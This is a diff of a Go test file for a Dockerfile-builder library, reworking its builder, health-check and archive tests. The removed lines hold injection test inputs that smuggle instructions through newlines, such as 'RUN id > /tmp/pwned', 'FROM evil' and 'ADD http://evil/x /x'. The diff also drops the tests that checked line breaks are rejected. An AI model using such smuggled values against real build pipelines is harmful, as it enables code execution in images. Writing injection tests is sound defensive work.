@@ -2,414 +2,227 @@ package kit
 
 import (
 	"archive/tar"
+	"context"
 	"io"
 	"os"
 	"path/filepath"
 	"strings"
 	"testing"
-
-	"github.com/stretchr/testify/require"
+	"time"
 )
 
-func TestDockerFileBuilder(t *testing.T) {
-	df := NewDockerFile().From("alpine", "latest").FromAs("golang:1.22", "build").Arg("VERSION").Arg("APP", "web").Env("FOO", "bar").Copy("a.txt", "b.txt").Copy("file with space.txt", "/dest with space").Add("src", "dest").Add("src file", "dest dir").Entrypoint("/bin/sh", "-c").Expose("80").Label("k", "v").Onbuild("RUN echo hi").Workdir("/app").StopSignal("SIGTERM").User("root").Comment("note").Volumes("/data", "/logs").HealthCheck(NewHealth().CMD("true").Timeout(1).Interval(1).Retries(1)).Run("apk add --no-cache curl").Run("echo still-run").RunArgs("--no-cache", "ok").Command("sleep", "infinity")
+func TestDockerfileBuilder(t *testing.T) {
+	t.Parallel()
+	df := NewDockerfile().
+		From("alpine", "latest").
+		FromAs("golang:1.22", "build").
+		Arg("VERSION").
+		Arg("APP", "web").
+		Env("FOO", "bar").
+		Copy("a.txt", "b.txt").
+		Copy("file with space.txt", "/dest with space").
+		Add("src", "dest").
+		Add("src file", "dest dir").
+		Entrypoint("/bin/sh", "-c").
+		Expose("80").
+		Label("k", "v").
+		Onbuild("RUN echo hi").
+		Workdir("/app").
+		StopSignal("SIGTERM").
+		User("root").
+		Comment("note").
+		Volumes("/data", "/logs").
+		HealthCheck(Test("CMD", "true"), Timeout(time.Second), Interval(time.Second), Retries(1)).
+		Run("apk add --no-cache curl").
+		Run("echo still-run").
+		RunArgs("--no-cache", "ok").
+		Command("sleep", "infinity")
 
-	require.NoError(t, df.Validate())
+	if err := df.Validate(); err != nil {
+		t.Fatal(err)
+	}
 	s := df.String()
-	require.Contains(t, s, "FROM alpine:latest")
-	require.Contains(t, s, "FROM golang:1.22 AS build")
-	require.Contains(t, s, `COPY ["file with space.txt", "/dest with space"]`)
-	require.Contains(t, s, `ADD ["src file", "dest dir"]`)
-	require.Contains(t, s, "RUN apk add --no-cache curl && \\")
-	require.Contains(t, s, "CMD [\"sleep\", \"infinity\"]")
-	require.Contains(t, s, `ENTRYPOINT ["/bin/sh", "-c"]`)
-	require.Contains(t, s, `VOLUME ["/data", "/logs"]`)
-	require.Contains(t, s, "--interval=1s")
-	require.Contains(t, s, "--timeout=1s")
-	require.Contains(t, s, "--retries=1")
-	require.NotContains(t, s, "--start-period=")
-	require.Contains(t, s, `CMD ["true"]`)
-	require.Contains(t, NewBuild().Dockerfile(df).spec.DockerfileInline, "FROM alpine:latest")
+	for _, want := range []string{
+		"FROM alpine:latest",
+		"FROM golang:1.22 AS build",
+		`COPY ["file with space.txt", "/dest with space"]`,
+		`ADD ["src file", "dest dir"]`,
+		"RUN apk add --no-cache curl && \\",
+		`CMD ["sleep", "infinity"]`,
+		`ENTRYPOINT ["/bin/sh", "-c"]`,
+		`VOLUME ["/data", "/logs"]`,
+		"--interval=1s",
+		"--timeout=1s",
+		"--retries=1",
+		`CMD ["true"]`,
+	} {
+		if !strings.Contains(s, want) {
+			t.Fatalf("missing %q in:\n%s", want, s)
+		}
+	}
+	if strings.Contains(s, "--start-period=") {
+		t.Fatalf("unexpected start-period in %s", s)
+	}
+
+	svc := NewService(Name("api"), Build(df))
+	p := NewCompose("app").WithService(svc)
+	yml, err := p.ExportYAML()
+	if err != nil {
+		t.Fatal(err)
+	}
+	text := string(yml)
+	if !strings.Contains(text, "dockerfile_inline:") || !strings.Contains(text, "FROM alpine:latest") {
+		t.Fatalf("export = %s", text)
+	}
 
 	path := filepath.Join(t.TempDir(), "Dockerfile")
-	require.NoError(t, df.Export(path, 0644))
-
+	if err := df.Export(path, 0644); err != nil {
+		t.Fatal(err)
+	}
+	got := ReadDockerfile(path)
+	if err := got.Validate(); err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(got.String(), "FROM alpine:latest") {
+		t.Fatalf("ReadDockerfile = %s", got.String())
+	}
 	src := t.TempDir()
-	require.NoError(t, os.WriteFile(filepath.Join(src, "a.txt"), []byte("x"), 0644))
-	require.NoError(t, os.Mkdir(filepath.Join(src, "sub"), 0755))
-	r, err := NewBuild().Context(src).Dockerfile(df).Reader()
-	require.NoError(t, err)
-	buf := make([]byte, 16)
-	n, err := r.Read(buf)
-	require.NoError(t, err)
-	require.Greater(t, n, 0)
-}
-
-func TestDockerFileErrors(t *testing.T) {
-	df := NewDockerFile().From("alpine", "latest").Command("true").Command("false")
-	require.Error(t, df.Validate())
-	require.Error(t, df.Export(filepath.Join(t.TempDir(), "D"), 0644))
-
-	df2 := NewDockerFile().From("alpine", "latest").CommandShell("echo", "hi").CommandShell("echo", "again")
-	require.Error(t, df2.Validate())
-
-	df3 := NewDockerFile().RunArgs("x")
-	require.Error(t, df3.Validate())
-	require.Contains(t, df3.Validate().Error(), "runargs")
-
-	df4 := NewDockerFile().From("alpine", "latest")
-	_, err := NewBuild().Context(filepath.Join(t.TempDir(), "missing")).Dockerfile(df4).Reader()
-	require.Error(t, err)
-
-	bad := NewDockerFile()
-	bad.errs = append(bad.errs, errString("boom"))
-	_, err = NewBuild().Context(t.TempDir()).Dockerfile(bad).Reader()
-	require.Error(t, err)
-
-	df5 := NewDockerFile().From("%s", "%s").Format("alpine", "latest")
-	require.Contains(t, df5.String(), "FROM alpine:latest")
-
-	df6 := NewDockerFile().From("alpine", "latest").CommandShell("echo", "ok")
-	require.NoError(t, df6.Validate())
-	require.True(t, strings.HasPrefix(df6.String(), "FROM alpine:latest"))
-}
-
-func TestDockerFileInstructions(t *testing.T) {
-	df := NewDockerFile().Syntax("docker/dockerfile:1").Escape(`\`).Check("error=true").From("scratch", "").FromPlatform("linux/amd64", "alpine", "3.20").FromAsPlatform("linux/arm64", "golang:1.22", "build").Copy("out", "/bin/app", CopyOpts{
-		From:    "build",
-		Chown:   "nobody:nobody",
-		Chmod:   "755",
-		Parents: true,
-		Link:    true,
-		Exclude: []string{"*.md"},
-	}).Add("repo", "/src", AddOpts{
-		Checksum:   "sha256:abc",
-		KeepGitDir: true,
-		Link:       true,
-	}).Shell("/bin/bash", "-c").EntrypointShell("nginx", "-g", "daemon off;").HealthCheckNone().Run("echo a").RunLayer("echo b").Run("echo c", RunOpts{
-		Mount:    []string{"type=cache,target=/cache"},
-		Network:  "none",
-		Security: "sandbox",
-	}).Command("true")
-
-	require.NoError(t, df.Validate())
-	s := df.String()
-	require.True(t, strings.HasPrefix(s, "# syntax=docker/dockerfile:1\n# escape=\\\n# check=error=true\n"))
-	require.Contains(t, s, "FROM scratch\n")
-	require.NotContains(t, s, "FROM scratch:")
-	require.Contains(t, s, "FROM --platform=linux/amd64 alpine:3.20\n")
-	require.Contains(t, s, "FROM --platform=linux/arm64 golang:1.22 AS build\n")
-	require.Contains(t, s, "COPY --from=build --chown=nobody:nobody --chmod=755 --exclude=*.md --parents --link out /bin/app\n")
-	require.Contains(t, s, "ADD --checksum=sha256:abc --keep-git-dir=true --link repo /src\n")
-	require.Contains(t, s, `SHELL ["/bin/bash", "-c"]`)
-	require.Contains(t, s, "ENTRYPOINT nginx -g daemon off;\n")
-	require.Contains(t, s, "HEALTHCHECK NONE\n")
-	require.Contains(t, s, "RUN echo a\nRUN echo b\n")
-	require.NotContains(t, s, "echo a &&")
-	require.Contains(t, s, "RUN --mount=type=cache,target=/cache --network=none --security=sandbox echo c\n")
-	require.Equal(t, `CMD ["true"]`+"\n", s[strings.LastIndex(s, "CMD "):])
-}
-
-func TestDockerFileHealthcheckShell(t *testing.T) {
-	df := NewDockerFile().HealthCheck(NewHealth().CMDShell("curl -f http://localhost || exit 1").Interval(5))
-	require.NoError(t, df.Validate())
-	require.Equal(t,
-		"HEALTHCHECK --interval=5s \\\n\tCMD curl -f http://localhost || exit 1\n",
-		df.String(),
-	)
-
-	none := NewDockerFile().HealthCheck(NewHealth().None())
-	require.NoError(t, none.Validate())
-	require.Equal(t, "HEALTHCHECK NONE\n", none.String())
-
-	bad := NewDockerFile().HealthCheck(NewHealth().Timeout(-1).CMD("true"))
-	require.Error(t, bad.Validate())
-	require.Empty(t, bad.String())
-}
-
-func TestDockerFileValidation(t *testing.T) {
-	require.Error(t, NewDockerFile().From("scratch", "").Syntax("docker/dockerfile:1").Validate())
-	require.Error(t, NewDockerFile().Syntax("a").Syntax("b").Validate())
-	require.Error(t, NewDockerFile().Escape("x").Validate())
-	require.Error(t, NewDockerFile().From("alpine:3", "latest").Validate())
-	require.Equal(t, "CMD [\"true\"]\n", NewDockerFile().Command("true").String())
-	require.Equal(t, "ENTRYPOINT [\"sleep\"]\n", NewDockerFile().Entrypoint("sleep").String())
-	require.Error(t, NewDockerFile().Volumes().Validate())
-	require.Error(t, NewDockerFile().Copy("a", "b", CopyOpts{}, CopyOpts{From: "x"}).Validate())
-	require.Error(t, NewDockerFile().Run("echo a", RunOpts{Network: "none"}, RunOpts{Network: "host"}).Validate())
-
-	bad := NewDockerFile().RunArgs("x")
-	project := NewProject("app").WithService(NewService("api", NewContainer().Image("alpine")).Dockerfile(bad))
-	require.Error(t, project.Validate())
-	svc, err := project.GetService("api")
-	require.NoError(t, err)
-	require.Nil(t, svc.Build)
-
-	okDF := NewDockerFile().From("alpine", "latest").Command("true")
-	okProject := NewProject("app").WithService(NewService("api", NewContainer()).Dockerfile(okDF))
-	require.NoError(t, okProject.Validate())
-	okSvc, err := okProject.GetService("api")
-	require.NoError(t, err)
-	require.NotNil(t, okSvc.Build)
-	require.Contains(t, okSvc.Build.DockerfileInline, "FROM alpine:latest")
-	require.Contains(t, okSvc.Build.DockerfileInline, `CMD ["true"]`)
-}
-
-func TestDockerFileBuildContext(t *testing.T) {
-	src := t.TempDir()
-	require.NoError(t, os.WriteFile(filepath.Join(src, "Dockerfile"), []byte("FROM scratch\n"), 0644))
-	require.NoError(t, os.WriteFile(filepath.Join(src, "keep.txt"), []byte("keep"), 0644))
-	require.NoError(t, os.WriteFile(filepath.Join(src, "noise.log"), []byte("no"), 0644))
-	require.NoError(t, os.Mkdir(filepath.Join(src, "tmp"), 0755))
-	require.NoError(t, os.WriteFile(filepath.Join(src, "tmp", "secret"), []byte("x"), 0644))
-	require.NoError(t, os.WriteFile(filepath.Join(src, "tmp", "keep.txt"), []byte("kept"), 0644))
-	require.NoError(t, os.WriteFile(filepath.Join(src, "keep.log"), []byte("yes"), 0644))
-	script := filepath.Join(src, "script.sh")
-	require.NoError(t, os.WriteFile(script, []byte("#!/bin/sh\n"), 0755))
-	require.NoError(t, os.Chmod(script, 0755))
-	require.NoError(t, os.Symlink("keep.txt", filepath.Join(src, "link.txt")))
-	require.NoError(t, os.WriteFile(filepath.Join(src, ".dockerignore"), []byte("# comment\n*.log\n!keep.log\ntmp/\n!tmp/keep.txt\n"), 0644))
-
-	df := NewDockerFile().From("alpine", "latest").Command("true")
-	reader, err := NewBuild().Context(src).Dockerfile(df).Reader()
-	require.NoError(t, err)
-
-	entries := readTar(t, reader)
-	require.Equal(t, "FROM alpine:latest\nCMD [\"true\"]\n", entries["Dockerfile"].body)
-	require.Equal(t, "keep", entries["keep.txt"].body)
-	require.Equal(t, "yes", entries["keep.log"].body)
-	require.NotContains(t, entries, "noise.log")
-	require.NotContains(t, entries, "tmp/secret")
-	require.Equal(t, "kept", entries["tmp/keep.txt"].body)
-	require.NotContains(t, entries, "tmp/")
-	info, err := os.Stat(script)
-	require.NoError(t, err)
-	require.Equal(t, int64(info.Mode().Perm()), entries["script.sh"].header.Mode)
-	link := entries["link.txt"].header
-	require.Equal(t, byte(tar.TypeSymlink), link.Typeflag)
-	require.Equal(t, "keep.txt", link.Linkname)
-
-	diskReader, err := NewBuild().Context(src).Reader()
-	require.NoError(t, err)
-	require.Equal(t, "FROM scratch\n", readTar(t, diskReader)["Dockerfile"].body)
-
-	onlyFile, err := NewBuild().Dockerfile(ParseDockerfile("FROM scratch")).Reader()
-	require.NoError(t, err)
-	require.Equal(t, "FROM scratch\n", readTar(t, onlyFile)["Dockerfile"].body)
-	require.Error(t, ParseDockerfile("  ").Validate())
-
-	diskFile := filepath.Join(src, "Custom.Dockerfile")
-	require.NoError(t, os.WriteFile(diskFile, []byte("FROM alpine:3.20"), 0644))
-	loaded := ReadDockerfile(diskFile)
-	require.NoError(t, loaded.Validate())
-	require.Equal(t, "FROM alpine:3.20\n", loaded.String())
-	require.Error(t, ReadDockerfile(filepath.Join(src, "missing")).Validate())
-
-	require.Equal(t, "FROM alpine:latest\n", NewDockerFile().From("alpine:latest").String())
-	require.Error(t, NewDockerFile().From("alpine", "1", "2").Validate())
-	require.Error(t, NewDockerFile().Arg("A", "1", "2").Validate())
-
-	file := filepath.Join(t.TempDir(), "file")
-	require.NoError(t, os.WriteFile(file, []byte("x"), 0644))
-	_, err = NewBuild().Context(file).Dockerfile(df).Reader()
-	require.Error(t, err)
-	require.Contains(t, err.Error(), "not a directory")
-
-	badIgnore := t.TempDir()
-	require.NoError(t, os.WriteFile(filepath.Join(badIgnore, ".dockerignore"), []byte("[\n"), 0644))
-	require.NoError(t, os.WriteFile(filepath.Join(badIgnore, "a.txt"), []byte("a"), 0644))
-	_, err = NewBuild().Context(badIgnore).Dockerfile(df).Reader()
-	require.Error(t, err)
-}
-
-type tarEntry struct {
-	header *tar.Header
-	body   string
-}
-
-func readTar(t *testing.T, r io.Reader) map[string]tarEntry {
-	t.Helper()
-	out := map[string]tarEntry{}
+	if err := os.WriteFile(filepath.Join(src, "a.txt"), []byte("x"), 0644); err != nil {
+		t.Fatal(err)
+	}
+	r, err := df.Archive(src)
+	if err != nil {
+		t.Fatal(err)
+	}
 	tr := tar.NewReader(r)
+	names := map[string]bool{}
 	for {
-		header, err := tr.Next()
+		hdr, err := tr.Next()
 		if err == io.EOF {
-			return out
+			break
 		}
-		require.NoError(t, err)
-		copied := *header
-		entry := tarEntry{header: &copied}
-		if header.Typeflag != tar.TypeDir && header.Typeflag != tar.TypeSymlink {
-			body, err := io.ReadAll(tr)
-			require.NoError(t, err)
-			entry.body = string(body)
+		if err != nil {
+			t.Fatal(err)
 		}
-		out[header.Name] = entry
+		names[hdr.Name] = true
+	}
+	if !names["Dockerfile"] || !names["a.txt"] {
+		t.Fatalf("archive names = %v", names)
 	}
 }
 
-type errString string
+func TestDockerfileInstructions(t *testing.T) {
+	t.Parallel()
+	df := NewDockerFile().
+		Syntax("docker/dockerfile:1").
+		Escape(`\`).
+		Check("error=true").
+		From("scratch", "").
+		FromPlatform("linux/amd64", "alpine", "3.20").
+		FromAsPlatform("linux/arm64", "golang:1.22", "build").
+		Copy("out", "/bin/app", CopyOpts{
+			From:    "build",
+			Chown:   "nobody:nobody",
+			Chmod:   "755",
+			Parents: true,
+			Link:    true,
+			Exclude: []string{"*.md"},
+		}).
+		Add("repo", "/src", AddOpts{Checksum: "sha256:abc", KeepGitDir: true, Link: true}).
+		Shell("/bin/bash", "-c").
+		EntrypointShell("nginx", "-g", "daemon off;").
+		HealthCheckNone().
+		Run("echo a").
+		RunLayer("echo b").
+		Run("echo c", RunOpts{Mount: []string{"type=cache,target=/cache"}, Network: "none", Security: "sandbox"}).
+		Command("true")
 
-func (e errString) Error() string { return string(e) }
+	if err := df.Validate(); err != nil {
+		t.Fatal(err)
+	}
+	s := df.String()
+	if !strings.HasPrefix(s, "# syntax=docker/dockerfile:1\n# escape=\\\n# check=error=true\n") {
+		t.Fatalf("prefix = %q", s[:min(80, len(s))])
+	}
+	for _, want := range []string{
+		"FROM scratch\n",
+		"FROM --platform=linux/amd64 alpine:3.20\n",
+		"FROM --platform=linux/arm64 golang:1.22 AS build\n",
+		"COPY --from=build --chown=nobody:nobody --chmod=755 --exclude=*.md --parents --link out /bin/app\n",
+		"ADD --checksum=sha256:abc --keep-git-dir=true --link repo /src\n",
+		`SHELL ["/bin/bash", "-c"]`,
+		"ENTRYPOINT nginx -g daemon off;\n",
+		"HEALTHCHECK NONE\n",
+		"RUN echo a\nRUN echo b\n",
+		"RUN --mount=type=cache,target=/cache --network=none --security=sandbox echo c\n",
+	} {
+		if !strings.Contains(s, want) {
+			t.Fatalf("missing %q in:\n%s", want, s)
+		}
+	}
+	if strings.Contains(s, "FROM scratch:") {
+		t.Fatal("scratch should not have empty tag")
+	}
+	if strings.Contains(s, "echo a &&") {
+		t.Fatal("RunLayer should not fold")
+	}
+}
 
-func TestDockerfileTokenRejectsLineBreaks(t *testing.T) {
+func TestDockerfileErrorsAndFormat(t *testing.T) {
+	t.Parallel()
 	tests := []struct {
-		name    string
-		build   func() *Dockerfile
-		wantErr string
-		forbid  []string
+		name string
+		df   *Dockerfile
 	}{
-		{
-			name: "env value newline injects RUN",
-			build: func() *Dockerfile {
-				return NewDockerFile().
-					From("alpine:latest").
-					Env("APP_ENV", "safe\nRUN id > /tmp/pwned\nENV X=1").
-					Command("true")
-			},
-			wantErr: "env value",
-			forbid:  []string{"RUN id", "ENV X=1"},
-		},
-		{
-			name: "syntax directive newline injects FROM",
-			build: func() *Dockerfile {
-				return NewDockerFile().
-					Syntax("docker/dockerfile:1\nFROM evil").
-					From("alpine:latest").
-					Command("true")
-			},
-			wantErr: "syntax directive",
-			forbid:  []string{"FROM evil"},
-		},
-		{
-			name: "user newline injects RUN",
-			build: func() *Dockerfile {
-				return NewDockerFile().
-					From("alpine:latest").
-					User("nobody\nRUN id").
-					Command("true")
-			},
-			wantErr: "user",
-			forbid:  []string{"RUN id"},
-		},
-		{
-			name: "healthcheck shell newline injects RUN",
-			build: func() *Dockerfile {
-				return NewDockerFile().
-					From("alpine:latest").
-					HealthCheck(NewHealth().CMDShell("true\nRUN id")).
-					Command("true")
-			},
-			wantErr: "healthcheck shell command",
-			forbid:  []string{"RUN id"},
-		},
-		{
-			name: "arg default newline",
-			build: func() *Dockerfile {
-				return NewDockerFile().From("alpine:latest").Arg("V", "1\nADD http://evil/x /x")
-			},
-			wantErr: "arg default",
-			forbid:  []string{"ADD http://evil/x"},
-		},
-		{
-			name: "label value newline",
-			build: func() *Dockerfile {
-				return NewDockerFile().From("alpine:latest").Label("k", "v\nUSER root\nRUN echo pwned")
-			},
-			wantErr: "label value",
-			forbid:  []string{"USER root", "RUN echo pwned"},
-		},
-		{
-			name: "comment newline",
-			build: func() *Dockerfile {
-				return NewDockerFile().From("alpine:latest").Comment("note\nRUN echo pwned")
-			},
-			wantErr: "comment",
-			forbid:  []string{"RUN echo pwned"},
-		},
-		{
-			name: "workdir newline",
-			build: func() *Dockerfile {
-				return NewDockerFile().From("alpine:latest").Workdir("/app\nRUN id")
-			},
-			wantErr: "workdir",
-			forbid:  []string{"RUN id"},
-		},
-		{
-			name: "run newline",
-			build: func() *Dockerfile {
-				return NewDockerFile().From("alpine:latest").Run("echo a\nRUN id")
-			},
-			wantErr: "run",
-			forbid:  []string{"RUN id"},
-		},
-		{
-			name: "cr also rejected",
-			build: func() *Dockerfile {
-				return NewDockerFile().From("alpine:latest").Env("A", "b\rc")
-			},
-			wantErr: "env value",
-			forbid:  []string{"ENV A=b"},
-		},
+		{"second command", NewDockerfile().From("alpine", "latest").Command("true").Command("false")},
+		{"runargs without run", NewDockerfile().RunArgs("x")},
+		{"empty parse", ParseDockerfile("")},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			df := tt.build()
-			err := df.Validate()
-			require.Error(t, err)
-			require.Contains(t, err.Error(), tt.wantErr)
-			require.Contains(t, err.Error(), "line break")
-			out := df.String()
-			for _, bad := range tt.forbid {
-				require.NotContains(t, out, bad)
+			t.Parallel()
+			if err := tt.df.Validate(); err == nil {
+				t.Fatal("expected error")
 			}
 		})
 	}
+	df := NewDockerfile().From("%s", "%s").Format("alpine", "latest")
+	if err := df.Validate(); err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(df.String(), "FROM alpine:latest") {
+		t.Fatalf("format = %s", df.String())
+	}
 }
 
-func TestDockerfileFormatPlaceholders(t *testing.T) {
-	t.Run("percent in prior content is not reinterpreted", func(t *testing.T) {
-		df := NewDockerFile().From("%s").Env("PCT", "100%").Format("alpine")
-		require.NoError(t, df.Validate())
-		out := df.String()
-		require.Contains(t, out, "FROM alpine\n")
-		require.Contains(t, out, "ENV PCT=100%\n")
-		require.NotContains(t, out, "%!(EXTRA")
-		require.NotContains(t, out, "%!s")
-	})
-
-	t.Run("extra args without placeholders fail closed", func(t *testing.T) {
-		df := NewDockerFile().From("alpine").Env("PCT", "100%").Format("ignored")
-		require.Error(t, df.Validate())
-		require.Contains(t, df.Validate().Error(), "too many arguments")
-		require.Contains(t, df.String(), "ENV PCT=100%")
-	})
-
-	t.Run("intentional %s still works", func(t *testing.T) {
-		df := NewDockerFile().From("%s", "%s").Format("alpine", "latest")
-		require.NoError(t, df.Validate())
-		require.Equal(t, "FROM alpine:latest\n", df.String())
-	})
-
-	t.Run("format arg with newline fails", func(t *testing.T) {
-		df := NewDockerFile().From("%s").Format("alpine\nRUN id")
-		require.Error(t, df.Validate())
-		require.Contains(t, df.Validate().Error(), "format arg")
-		require.NotContains(t, df.String(), "RUN id")
-	})
-
-	t.Run("double percent escapes", func(t *testing.T) {
-		df := NewDockerFile().Env("PCT", "%%s").Format()
-		require.NoError(t, df.Validate())
-		require.Equal(t, "ENV PCT=%s\n", df.String())
-	})
+func TestBuildFileAndDockerfileConflict(t *testing.T) {
+	t.Parallel()
+	s := NewService(Name("api"), Build(DockerfilePath("Dockerfile"), NewDockerfile().From("alpine:latest")))
+	if err := s.Validate(); err == nil {
+		t.Fatal("expected File and Dockerfile conflict")
+	}
 }
 
-func TestDockerfileTokenHelper(t *testing.T) {
-	require.NoError(t, dockerfileToken("hello world"))
-	require.NoError(t, dockerfileToken("a\tb"))
-	require.Error(t, dockerfileToken("a\nb"))
-	require.Error(t, dockerfileToken("a\rb"))
-	require.Error(t, dockerfileToken("a\x00b"))
-	require.Error(t, dockerfileToken("a\x01b"))
+func TestDockerfileHealthcheckShell(t *testing.T) {
+	t.Parallel()
+	df := NewDockerfile().HealthCheck(Test("CMD-SHELL", "curl -f http://localhost || exit 1"), Interval(5*time.Second))
+	if err := df.Validate(); err != nil {
+		t.Fatal(err)
+	}
+	want := "HEALTHCHECK --interval=5s \\\n\tCMD curl -f http://localhost || exit 1\n"
+	if df.String() != want {
+		t.Fatalf("got %q want %q", df.String(), want)
+	}
+}
+
+func TestBuildImageUsesDockerfile(t *testing.T) {
+	t.Parallel()
+	api := &fakeEngine{}
+	df := NewDockerfile().From("alpine:latest").Run("echo ok").Command("true")
+	if _, err := BuildImage(context.Background(), api, df, Image("app:dev")); err != nil {
+		t.Fatal(err)
+	}
+	if len(api.built.Tags) != 1 || api.built.Tags[0] != "app:dev" || api.built.Dockerfile != "Dockerfile" {
+		t.Fatalf("built = %+v", api.built)
+	}
 }
